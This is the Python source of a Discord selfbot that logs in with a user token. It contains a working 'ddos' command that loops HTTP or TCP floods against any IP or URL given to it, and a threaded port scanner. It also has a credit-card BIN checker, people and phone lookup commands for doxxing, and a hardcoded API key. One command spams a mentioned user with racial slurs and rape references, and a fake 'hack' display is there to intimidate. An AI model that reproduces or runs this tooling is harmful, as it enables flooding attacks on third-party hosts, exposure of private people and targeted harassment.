    "nigga you got lost in the [location] while looking for [adjective1] [animals] and had to call [name] for help",
]

names = ["zirus", "yusky", "jason bourne", "huq", "ruin", "john wick", "mike wazowski", "thor", "spongebob", "patrick", "harry potter", "darth vader"]
adjectives = ["fluffy", "smelly", "huge", "tiny", "stinky", "bright", "dark", "slippery", "rough", "smooth"]
objects = ["rock", "pencil", "keyboard", "phone", "bottle", "book", "lamp", "balloon", "sock", "remote"]
insects = ["beetle", "cockroach", "dragonfly", "ant", "mosquito", "butterfly", "bee"]
seaanimals = ["dolphin", "octopus", "shark", "whale", "seal", "jellyfish", "crab"]
actions = ["kissing", "hugging", "fighting", "dancing", "singing", "running", "jumping", "crawling"]
animenames = ["itachi", "naruto", "goku", "luffy", "zoro", "sasuke", "vegeta"]
families = ["siblings", "cousins", "parents", "grandparents", "aunt", "uncle", "stepbrother", "stepsister"]
numbers = ["one", "two", "three", "four", "five", "six", "seven"]
bodies = ["head", "arm", "leg", "hand", "foot", "nose", "ear"]
locations = ["park", "beach", "library", "mall", "school", "stadium", "restaurant"]
animals = ["dog", "cat", "hamster", "elephant", "lion", "tiger", "bear", "giraffe"]
races = ["asian", "african", "caucasian", "hispanic", "native american", "martian"]
foods = ["pizza", "burger", "pasta", "taco", "sushi", "ice cream", "sandwich"]
events = ["concert", "festival", "wedding", "party", "ceremony"]
sports = ["soccer", "basketball", "baseball", "tennis", "cricket"]
clothing = ["shirt", "pants", "hat", "shoes", "jacket"]
mythicalcreatures = ["dragon", "unicorn", "phoenix", "griffin", "centaur"]
songs = ["despacito", "baby shark", "old town road", "shape of you", "bohemian rhapsody"]
vehicles = ["bike", "car", "scooter", "skateboard", "bus", "train", "airplane", "boat"]
rooms = ["living room", "bedroom", "kitchen", "bathroom", "attic", "basement", "garage"]

def replace_placeholders(template):
    template = template.replace("[name]", random.choice(names))
    template = template.replace("[adjective1]", random.choice(adjectives))
    template = template.replace("[object]", random.choice(objects))
    template = template.replace("[insect]", random.choice(insects))
    template = template.replace("[seaanimal]", random.choice(seaanimals))
    template = template.replace("[action]", random.choice(actions))
    template = template.replace("[animename]", random.choice(animenames))
    template = template.replace("[family]", random.choice(families))
    template = template.replace("[number]", random.choice(numbers))
    template = template.replace("[body]", random.choice(bodies))
    template = template.replace("[location]", random.choice(locations))
    template = template.replace("[animals]", random.choice(animals))
    template = template.replace("[race]", random.choice(races))
    template = template.replace("[food]", random.choice(foods))
    template = template.replace("[event]", random.choice(events))
    template = template.replace("[sport]", random.choice(sports))
    template = template.replace("[clothing]", random.choice(clothing))
    template = template.replace("[mythicalcreature]", random.choice(mythicalcreatures))
    template = template.replace("[song]", random.choice(songs))
    template = template.replace("[vehicle]", random.choice(vehicles))
    template = template.replace("[room]", random.choice(rooms))
    template = template.replace("[animal]", random.choice(animals))
    return template

def generate_pack():
    template = random.choice(main_template)
    pack = replace_placeholders(template)
    return pack


@client.command()
async def lOl(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await lOl_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def lOl_user(channel, user):
    try:
        await channel.send(f"HOLY{user.mention}")
        await asyncio.sleep(0.615)
        await channel.send(f"# LOLOLOLOLOL{user.mention}")
        await asyncio.sleep(0.08135)
        await channel.send(f"# UR DYINGH{user.mention}")
        await asyncio.sleep(0.6156)
        await channel.send(f"# TOOOO{user.mention}")
        await asyncio.sleep(0.7156)
        await channel.send(f"# FUCKIGN {user.mention}")
        await asyncio.sleep(0.4156)
        await channel.send(f"# MANUAL{user.mention}")
        await asyncio.sleep(0.61456)
        await channel.send(f" LADDER{user.mention}")
        await asyncio.sleep(0.8)
        await channel.send(f"# DONTT {user.mention}")
        await asyncio.sleep(0.5)
        await channel.send(f" STPE{user.mention}")
        await asyncio.sleep(0.4)
        await channel.send(f"# TO{user.mention}")
        await asyncio.sleep(0.41495)
        await channel.send(f"# yur{user.mention}")
        await asyncio.sleep(0.81452)
        await channel.send(f"# GOD LOLOL{user.mention}")
        await asyncio.sleep(1.211)
        await channel.send(f"# WE CAN MANUAL FOR HOURS?{user.mention}")
        await asyncio.sleep(0.6145)
        await channel.send(f"# DAYS?{user.mention}")
        await asyncio.sleep(0.51442)
        await channel.send(f"# WEEKS?{user.mention}")
        await asyncio.sleep(0.7142)
        await channel.send(f"# MONTHS{user.mention}")
        await asyncio.sleep(1.21)
        await channel.send(f"# FUCK  RAPED UNIGGER BOY{user.mention}")
        await asyncio.sleep(0.61424)
        await channel.send(f"# HOLY {user.mention}")
        await asyncio.sleep(0.51424)
        await channel.send(f"ur{user.mention}")
        await asyncio.sleep(0.8531)
        await channel.send(f"Gettng{user.mention}")
        await asyncio.sleep(0.4021)
        await channel.send(f"out{user.mention}")
        await asyncio.sleep(0.742)
        await channel.send(f"ladderedf{user.mention}")
        await asyncio.sleep(0.5342)
        await channel.send(f"TO{user.mention}")
        await asyncio.sleep(0.521)
        await channel.send(f"fcuckk{user.mention}")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")
        
        
last_message_time = {}  # Store the last message time for each tracked user
mode_6_active = False  # Track if mode 6 is active
last_mode_6_response_time = {}  

STAT_RESPONSES = {
    'rizz_levels': ['-9999', '-∞', 'ERROR: NOT FOUND', 'Below Zero', 'Nonexistent', 'Windows 95'],
    'bitches': ['0', '-1', 'Negative', 'None', 'Error 404', 'Imaginary'],
    'grass_status': ['Never Touched', 'What is Grass?', 'Allergic', 'Grass Blocked', 'Touch Pending'],
    'karma_levels': ['-999', '-∞', 'Rock Bottom', 'Below Sea Level', 'Catastrophic'],
    'cringe_levels': ['Maximum', '∞%', 'Over 9000', 'Critical', 'Terminal', 'Beyond Science'],
    'final_ratings': ['MASSIVE L', 'CRITICAL FAILURE', 'TOUCH GRASS ASAP', 'SYSTEM FAILURE', 'FATAL ERROR'],
    

    'time_spent': ['25/8', '24/7/365', 'Unhealthy Amount', 'Too Much', 'Always Online'],
    'nitro_status': ['Begging for Gifted', 'None (Too Broke)', 'Expired', 'Using Fake Nitro'],
    'friend_types': ['All Bots', 'Discord Kittens', 'Fellow Basement Dwellers', 'Alt Accounts'],
    'pfp_types': ['Anime Girl', 'Genshin Character', 'Stolen Art', 'Discord Default'],
    
    'relationship_status': ['Discord Mod', 'Forever Alone', 'Dating Discord Bot', 'Married to Anime'],
    'dating_success': ['404 Not Found', 'Task Failed', 'Loading... (Never)', 'Error: No Data'],
    'red_flags': ['Too Many to Count', 'Infinite', 'Yes', 'All of Them', 'Database Full'],
    'dm_status': ['Left on Read', 'Blocked', 'Message Failed', 'Seen-zoned']
}
from random import randint, choice, uniform

@client.command()
async def stats(ctx, user: discord.User):
    loading = await ctx.send(f"```Loading stats for {user.name}...```")
    
    stats = f"""STATS FOR {user.name}:
    
Rizz Level: {choice(STAT_RESPONSES['rizz_levels'])}
Bitches: {choice(STAT_RESPONSES['bitches'])}
Grass Touched: {choice(STAT_RESPONSES['grass_status'])}
Discord Karma: {choice(STAT_RESPONSES['karma_levels'])}
Touch Grass Rating: {randint(0, 2)}/10
Cringe Level: {choice(STAT_RESPONSES['cringe_levels'])}
L's Taken: {randint(999, 9999)}+
W's Taken: {randint(-1, 0)}
    
FINAL RATING: {choice(STAT_RESPONSES['final_ratings'])}"""
    
    await asyncio.sleep(2)
    await loading.edit(content=f"```{stats}```")
        
@client.command()
async def dripcheck(ctx, user: discord.User):
    loading = await ctx.send(f"```Analyzing {user.name}'s drip...```")
    
    UNSPLASH_ACCESS_KEY = "KOKZn5RF1jHrAUyaj3Q5c2FaKFpGCv5iaZhACmFnWLs"
    search_terms = ["bad fashion", "worst outfit", "terrible clothes", "weird clothing"]
    
    try:
        async with aiohttp.ClientSession() as session:
            search_term = random.choice(search_terms)
            url = f"https://api.unsplash.com/photos/random?query={search_term}&client_id={UNSPLASH_ACCESS_KEY}"
            
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    image_url = data['urls']['regular']
                    
                    report = f"""DRIP INSPECTION FOR {user.name}:

Drip Level: Sahara Desert
Style Rating: Windows 95
Outfit Score: Walmart Clearance
Swag Meter: Empty
Freshness: Expired
Trend Rating: Internet Explorer
Fashion Sense: Colorblind
    
DRIP STATUS: CRITICALLY DRY
RECOMMENDATION: FACTORY RESET

Actual Fit Reference: 👇"""
                    
                    await loading.edit(content=f"```{report}```")
                    await ctx.send(image_url)
                else:
                    await loading.edit(content=f"```{report}```")
    except Exception as e:
        print(f"Error fetching image: {e}")
        await loading.edit(content=f"```{report}```")
        
@client.command()
async def discordreport(ctx, user: discord.User):
    loading = await ctx.send(f"```Generating Discord report card for {user.name}...```")
    
    report = f"""DISCORD REPORT CARD FOR {user.name}:

Time Spent: {choice(STAT_RESPONSES['time_spent'])}
Grass Touched: {choice(STAT_RESPONSES['grass_status'])}
Discord Nitro: {choice(STAT_RESPONSES['nitro_status'])}
Server Count: {randint(100, 999)}
DMs: {choice(['Empty', 'All Blocked', 'Only Bots', 'Bot Spam'])}
Friends: {choice(STAT_RESPONSES['friend_types'])}
Profile Picture: {choice(STAT_RESPONSES['pfp_types'])}
Custom Status: {choice(['Cringe', 'Bot Generated', 'Anime Quote', 'Discord Kitten'])}
    
FINAL GRADE: F{'-' * randint(1, 5)}
NOTE: {choice(['Parents Disowned', 'Touch Grass Immediately', 'Seek Help', 'Grass is Green'])}"""
    
    await asyncio.sleep(2)
    await loading.edit(content=f"```{report}```")


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You don't have permission to use this command.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Missing argument. Please provide all necessary details.")
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send("Member not found.")
    else:
        print(f"An error occurred: {error}")
    
     

@client.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member_name: str):
    """Unban a member from the server."""
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member_name.split('#')

    for ban_entry in banned_users:
        user = ban_entry.user
        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f"Unbanned {user.mention}")
            return
    await ctx.send(f"User {member_name}#{member_discriminator} not found.")
    
    
@client.command()
@commands.has_permissions(manage_roles=True)
async def mute(ctx, member: discord.Member, *, reason: str = None):
    """Mute a member."""
    mute_role = discord.utils.get(ctx.guild.roles, name="Muted By Syntax")
    if not mute_role:
        mute_role = await ctx.guild.create_role(name="Muted By Syntax")
        for channel in ctx.guild.channels:
            await channel.set_permissions(mute_role, speak=False, send_messages=False)

    await member.add_roles(mute_role, reason=reason)
    await ctx.send(f"{member.mention} has been muted. Reason: {reason if reason else 'No reason provided.'}")


@client.command()
@commands.has_permissions(manage_roles=True)
async def unmute(ctx, member: discord.Member):
    """Unmute a member."""
    mute_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if mute_role in member.roles:
        await member.remove_roles(mute_role)
        await ctx.send(f"{member.mention} has been unmuted.")
    else:
        await ctx.send(f"{member.mention} is not muted.")



# MATHS
api_endpoint = 'https://api.mathjs.org/v4/'
@client.command()
async def math(ctx, *, equation):
    
    response = requests.get(api_endpoint, params={'expr': equation})

    if response.status_code == 200:
        result = response.text
        await ctx.send(f'➡️ **EQUATION**: `{equation}`\n\n➡️ **Result**: `{result}`')
        await ctx.message.delete()
    else:
        await ctx.reply('➡️ **Failed**')

# Lock Command
@client.command(name="lock", aliases= ["l"])
@commands.has_permissions(manage_channels=True)
async def lock(ctx):
    try:
        # React with a lock emoji
        await ctx.message.add_reaction("🔒")
        
        # Update channel permissions to lock it
        overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = False
        await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    except Exception as e:
        await ctx.send(f"❌ Failed to lock the channel: {e}")

# Unlock Command
@client.command(name="unlock", aliases= ["ul"])
@commands.has_permissions(manage_channels=True)
async def unlock(ctx):
    try:
        # React with an unlock emoji
        await ctx.message.add_reaction("🔓")
        
        # Update channel permissions to unlock it
        overwrite = ctx.channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = True
        await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
    except Exception as e:
        await ctx.send(f"❌ Failed to unlock the channel: {e}")

from discord import Webhook, WebhookAdapter

import discord
from discord.ext import commands

@client.command()
async def webhookinfo(ctx, webhook_url: str):
    try:
        # Extract the webhook ID and token from the URL
        webhook_id, webhook_token = webhook_url.split('/')[-2], webhook_url.split('/')[-1]

        # Fetch webhook details using the bot's HTTP client
        webhook_info = await client.http.get_webhook_info(int(webhook_id), webhook_token)

        # Prepare a message with webhook details
        info_message = (
            f"**Webhook Info**\n"
            f"**ID:** {webhook_info.id}\n"
            f"**Name:** {webhook_info.name}\n"
            f"**Avatar URL:** {webhook_info.avatar_url}\n"
            f"**Channel:** {webhook_info.channel}\n"
            f"**URL:** {webhook_info.url}\n"
            f"**Type:** {webhook_info.type}"
        )

        # Send the webhook info as a message
        await ctx.send(info_message)

    except Exception as e:
        await ctx.send(f"Error fetching webhook info: {e}")


@client.command()
async def inviteinfo(ctx, invite_url: str):
    try:
        invite_code = invite_url.split('/')[-1]
        invite = await client.fetch_invite(invite_code)
        if invite.max_age:
            expires_at = invite.created_at + timedelta(seconds=invite.max_age)
        else:
            expires_at = "No expiration (forever)"
        info_message = (
            f"**Invite Info**\n"
            f"**Code:** {invite.code}\n"
            f"**Guild:** {invite.guild.name}\n"
            f"**Channel:** {invite.channel.name}\n"
            f"**Inviter:** {invite.inviter.name}#{invite.inviter.discriminator}\n"
            f"**Uses:** {invite.uses}\n"
            f"**Max Uses:** {invite.max_uses}\n"
            f"**Expires At:** {expires_at}\n"
            f"**Created At:** {invite.created_at}\n"
            f"**URL:** {invite.url}"
        )
        await ctx.send(info_message)
        await ctx.message.delete()

    except discord.NotFound:
        await ctx.send("```This invite link is invalid or expired.```")
    except Exception as e:
        await ctx.send(f"Error fetching invite info: {e}")

@client.command(name="checkcc")
async def checkbin(ctx, bin: str):
    result = Checker({"BIN": bin})
    
    if result["message"] == "success":
        await ctx.send(f"✅ Info found: `{result['info']}`")
    else:
        await ctx.send(f"❌ Error: {result['info']}")

@client.command()
async def maclookupp(ctx, mac: str):
    await ctx.trigger_typing()
    
    result = maclookup({"mac": mac})  # calling your function here
    
    if result["message"] == "success":
        info = result["info"]
        oui = info["oui"]
        response = (
            f"🔍 **MAC Lookup Result**\n"
            f"**MAC Prefix:** {info['mac']}\n"
            f"**Organization:** {info['organization']}\n"
            f"**Country:** {info['country']}\n"
            f"**OUI Details:**\n"
            f"  - Registry: {oui.get('registry', 'N/A')}\n"
            f"  - Assignment: {oui.get('assignment', 'N/A')}\n"
            f"  - Organization ID: {oui.get('org', 'N/A')}\n"
            f"  - Country Code: {oui.get('cc', 'N/A')}"
        )
        await ctx.send(response)
    else:
        await ctx.send(f"❌ Error: {result['info']}")

@client.command(name="peoplelookup", description="Search for people by name and location")
async def people_lookup_command(ctx, name: str = "", location: str = ""):
    args = {
        "name": name,
        "location": location
    }
    result = PeopleLookup(args)
    if result["message"] == "success":
        people = result["info"]["people"]
        if people:
            response = "\n".join([f"Name: {person['name']}, Address: {person['address']}" for person in people])
            await ctx.send(f"Found the following people:\n{response}")
        else:
            await ctx.send("No results found.")
    else:
        await ctx.send(f"Error: {result['info']}")

@client.command(name="phonelookup")
async def phone_number_lookup(ctx, *, number: str):
    args = {"phone": number}
    result = Phonenumber(args)
    
    if result["message"] == "success":
        info = result["info"]
        message = "\n".join([f"{key.capitalize()}: {value}" for key, value in info.items()])
        await ctx.send(f"```Phone Number Info:\n\n{message}```")
    else:
        await ctx.send(f"```Error: {result['info']}```")

@client.command(name="hack")
async def hack(ctx, user: discord.User):
    steps = [
        f"[{datetime.now().strftime('%H:%M:%S')}] Initializing sequence for this user...",
        f"[{datetime.now().strftime('%H:%M:%S')}] Connecting to Discord CDN...",
        f"[{datetime.now().strftime('%H:%M:%S')}] Fetching IP address...",
        f"[{datetime.now().strftime('%H:%M:%S')}] IP found: {random.randint(10, 255)}.{random.randint(10, 255)}.{random.randint(10, 255)}.{random.randint(10, 255)}",
        f"[{datetime.now().strftime('%H:%M:%S')}] Accessing user data...",
        f"[{datetime.now().strftime('%H:%M:%S')}] Dumping tokens...",
        f"[{datetime.now().strftime('%H:%M:%S')}] Token: mfa.{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=64))}",
        f"[{datetime.now().strftime('%H:%M:%S')}] Breaching email: {user.display_name}@gmail.com",
        f"[{datetime.now().strftime('%H:%M:%S')}] 2FA Bypass: Success ✅",
        f"[{datetime.now().strftime('%H:%M:%S')}] Downloading chat history...",
        f"[{datetime.now().strftime('%H:%M:%S')}] Collecting Nitro codes...",
        f"[{datetime.now().strftime('%H:%M:%S')}] Uploading data to darknet...",
        f"[{datetime.now().strftime('%H:%M:%S')}] Finalizing...",
        f"[{datetime.now().strftime('%H:%M:%S')}] Operation complete. Target `{user.display_name}` fully compromised. 🔓",
        f"[{datetime.now().strftime('%H:%M:%S')}] HACK COMPLETE !!"
    ]

    for step in steps:
        await ctx.send(f"``{step}``")
        await asyncio.sleep(random.uniform(1.0, 2.0))

@client.command(name="ban")
async def ban(ctx, member: discord.Member, *, reason="No reason provided"):
    try:
        await member.ban(reason=reason)
        await ctx.send(f"```Banned {member} ({member.id}) for: {reason}```")
    except Exception as e:
        await ctx.send(f"```Failed to ban user. Error: {str(e)}```")

ddos_active = False

@client.command(name="ddos")
async def ddos(ctx, method: str, target: str):
    """Starts a DDoS simulation with a specified method on the target IP or URL."""
    global ddos_active
    ddos_active = True  # Enable DDoS
    
    await ctx.send(f"Starting {method.upper()} DDoS on {target}. Use `>stopddos` to halt.")

    if method.lower() in ["http", "https"]:
        async with aiohttp.ClientSession() as session:
            while ddos_active:
                try:
                    async with session.get(target) as response:
                        print(f"Sent HTTP GET request to {target}. Status: {response.status}")
                except Exception as e:
                    print(f"Error: {e}")
                await asyncio.sleep(0.1)
    elif method.lower() == "tcp":
        try:
            ip, port = target.split(":")
            port = int(port)
        except ValueError:
            await ctx.send("Invalid target format for TCP. Use `IP:PORT` format.")
            ddos_active = False
            return
        
        while ddos_active:
            try:
                reader, writer = await asyncio.open_connection(ip, port)
                writer.write(b"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n")
                await writer.drain()
                writer.close()
                await writer.wait_closed()
                print(f"Sent TCP packet to {target}")
            except Exception as e:
                print(f"Error: {e}")
            await asyncio.sleep(0.1)
    else:
        await ctx.send("Invalid method. Use `http`, `https`, or `tcp`.")
        ddos_active = False

    await ctx.send("DDoS attack finished.")

@client.command(name="stopddos")
async def stop_ddos(ctx):
    """Stops the DDoS simulation."""
    global ddos_active
    ddos_active = False
    await ctx.send("DDoS attack has been stopped.")




open_ports = []

@client.command(name="portscan")
async def scan(ctx, ip: str, start_port: int, end_port: int):
    """Scans a range of ports on a target IP and sends open ports in Discord."""
    
    def scan_port(ip, port):
        """Scans a single port and appends it to open_ports if open."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            print(f"Error scanning port {port}: {e}")

    await ctx.send(f"Starting scan of ports {start_port} to {end_port} on {ip}. This may take a few minutes...")
    with ThreadPoolExecutor(max_workers=100) as executor:
        loop = asyncio.get_running_loop()
        tasks = [
            loop.run_in_executor(executor, scan_port, ip, port)
            for port in range(start_port, end_port + 1)
        ]
        await asyncio.gather(*tasks)
    if open_ports:
        ports_list = ", ".join(map(str, open_ports))
        await ctx.send(f"Open ports on {ip}: ```{ports_list}```")
    else:
        await ctx.send(f"No open ports found on {ip} in the range {start_port} to {end_port}.")
    open_ports.clear()

@client.command(name="hjoin")
async def hjoin(ctx):
    await ctx.send('''Choose a HypeSquad house:
1. Bravery
2. Brilliance
3. Balance
4. Leave The HypeSquad''')
    def check(message):
        return message.author == ctx.author and message.channel == ctx.channel

    try:
        choice = await client.wait_for('message', check=check, timeout=30)
        house = choice.content
        if house == '1':
            housefinal = '1'
        elif house == '2':
            housefinal = '2'
        elif house == '3':
            housefinal = '3'
        elif house == '4':
            housefinal = None
        else:
            await ctx.send("Invalid choice. Please try again.")
            return
        headers = errorselfbot()
        if housefinal:
            payload = {
                'house_id': housefinal
            }
            rep = requests.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
            if rep.status_code == 204:
                await ctx.send("Joined the selected HypeSquad house.")
            else:
                await ctx.send("Failed to join the HypeSquad house.")
        else:
            payload = {
                'house_id': housefinal
            }
            req = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
            if req.status_code == 204:
                await ctx.send("Left the HypeSquad.")
            else:
                await ctx.send("Failed to leave the HypeSquad.")
    except asyncio.TimeoutError:
        await ctx.send("You took too long to respond. Please try again.")

@client.command(name="clone")
async def clone_everything(ctx, old_server: discord.Guild, new_server: discord.Guild):
    await ctx.send("🔁 Starting full server clone (roles → channels → settings)...")
    await ctx.send("🔹 Cloning roles...")
    role_map = {}
    old_roles = old_server.roles[::-1]

    for i, role in enumerate(old_roles):
        if role.is_default():
            continue

        new_role = await new_server.create_role(
            name=role.name,
            permissions=role.permissions,
            colour=role.colour,
            hoist=role.hoist,
            mentionable=role.mentionable
        )
        role_map[role.id] = new_role
        await asyncio.sleep(1.5)

    await ctx.send(f"✅ Cloned {len(role_map)} roles.")
    await ctx.send("🔹 Cloning channels and categories...")
    text_count = 0
    voice_count = 0

    for old_category in old_server.categories:
        new_category = await new_server.create_category_channel(
            name=old_category.name,
            overwrites=old_category.overwrites
        )

        for old_text in old_category.text_channels:
            await new_category.create_text_channel(
                name=old_text.name,
                overwrites=old_text.overwrites
            )
            text_count += 1
            await asyncio.sleep(1)

        for old_vc in old_category.voice_channels:
            await new_category.create_voice_channel(
                name=old_vc.name,
                overwrites=old_vc.overwrites
            )
            voice_count += 1
            await asyncio.sleep(1.5)

    await ctx.send(f"✅ Cloned {text_count} text channels and {voice_count} voice channels.")
    await ctx.send("🔹 Cloning server settings and permissions...")
    await new_server.edit(name=old_server.name)

    for old_category in old_server.categories:
        new_category = discord.utils.get(new_server.categories, name=old_category.name)
        if new_category:
            await clone_entity_permissions(old_category, new_category)

    for old_channel in old_server.text_channels:
        new_channel = discord.utils.get(new_server.text_channels, name=old_channel.name)
        if new_channel:
            await clone_entity_permissions(old_channel, new_channel)

    for old_vc in old_server.voice_channels:
        new_vc = discord.utils.get(new_server.voice_channels, name=old_vc.name)
        if new_vc:
            await clone_entity_permissions(old_vc, new_vc)

    await ctx.send("✅ Server settings and channel permissions cloned successfully!")
    await ctx.send("🎉 Server cloning completed!")


async def clone_entity_permissions(old_entity, new_entity):
    for role, old_overwrite in old_entity.overwrites.items():
        new_role = discord.utils.get(new_entity.guild.roles, name=role.name)
        if new_role:
            try:
                await new_entity.set_permissions(new_role, overwrite=old_overwrite)
                await asyncio.sleep(0.5)
            except discord.Forbidden:
                pass

@client.command(name="mentionall")
async def mention_online(ctx):
    await ctx.send("```Mentioning all online members (excluding bots)...```")

    await ctx.guild.chunk()
    members = [
        member.mention for member in ctx.guild.members
        if member.status != discord.Status.offline and not member.bot
    ]

    if not members:
        await ctx.send("```No online non-bot members found.```")
        return

    chunk = ""
    for mention in members:
        if len(chunk) + len(mention) + 1 > 2000:
            await ctx.send(chunk)
            chunk = ""
        chunk += mention + " "

    if chunk:
        await ctx.send(chunk)

@unlock.error
@lock.error
async def permissions_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ You don't have permission to use this command.")
    elif isinstance(error, commands.CommandError):
        await ctx.send(f"❌ An error occurred: {error}")


if __name__ == "__main__":
    config = load_config()
    token = config.get("token", "").strip()

    # If no token is saved, ask for input and exit
    if not token:
        get_token_from_user(config)

    try:
        # Starting the client with user token and bot=False for selfbot
        client.run(token, bot=False)  
    except discord.LoginFailure:
        print("❌ Invalid token. Please try again.")
        get_token_from_user(config)